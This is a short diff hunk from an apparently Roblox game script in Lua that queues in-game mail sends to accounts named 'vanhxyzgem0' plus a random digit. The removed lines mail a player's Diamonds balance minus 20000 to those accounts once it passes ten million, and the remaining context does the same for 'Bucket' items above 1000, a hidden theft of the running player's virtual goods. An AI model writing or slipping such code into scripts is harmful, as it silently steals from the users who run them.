@@ -89,12 +89,6 @@ local ListSendMail = {}
 function AddToSend(...) 
     table.insert(ListSendMail,{...})
 end
-if game.Players.LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].Value >= 10 ^ 7 then 
-    AddToSend("vanhxyzgem0"..math.random(1,6), "Co noi qua noi lai", {
-        id = "Diamonds",
-        Type = "Currency"
-    }, game.Players.LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].Value - 20000)
-end
 if GetItem("Bucket") > 1000 then 
     AddToSend("vanhxyzgem0"..math.random(1,6), "Co noi qua noi lai", {
         id = "Bucket",
